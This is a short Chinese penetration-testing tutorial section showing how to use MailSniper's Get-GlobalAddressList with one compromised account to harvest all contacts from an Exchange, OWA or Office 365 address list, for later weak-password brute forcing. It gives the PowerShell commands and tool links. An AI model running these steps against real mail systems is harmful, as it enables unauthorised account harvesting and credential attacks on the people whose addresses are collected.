### 8、mailsniper.ps1获取outlook所有联系人

**条件**

掌握其中一个用户邮箱的账号密码，并且可以登录outlook-
outlook地址可以是官方的也可以是目标自己搭建的，并无影响

**目的**

获取目标邮箱里的所有联系人，方便后续爆破弱口令等等

**利用**

将尝试 Outlook Web Access（OWA）和Exchange Web服务（EWS）的方法。此命令可用于从Exchange收集电子邮件列表 ：

    Get-GlobalAddressList -ExchHostname "outlook地址” -UserName “域名/域用户名” -Password “密码” -OutFile global-address-list.txt
    
        

**可以自己搭建目标outlook在自己服务器上**

此处使用kion的域环境模拟-
在mailsniper. ps1最后一行加入以下代码,也可以通过传参的形式调用

    Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016 -OutFile global-address-list.txt
    
        

尝试使用我们传递的账号密码去登录目标的outlook，成功登录后会把邮件里的联系人都获取下来，并输出保存到文件里

如果outlook在Office365上道理也是一样的，把ExchHostname指向outlook.office365.com即可，username使用完整的邮箱不要是用户名即可

    Get-GlobalAddressList -ExchHostname outlook.office365.com -Username 用户名@邮箱.....
    
        

**参考链接**

    https://www.blackhillsinfosec.com/abusing-exchange-mailbox-permissions-mailsniper/
    https://www.cnblogs.com/backlion/p/6812690.html
    
        

**工具地址**

    https://github.com/dafthack/mailsniper
    
        

* * *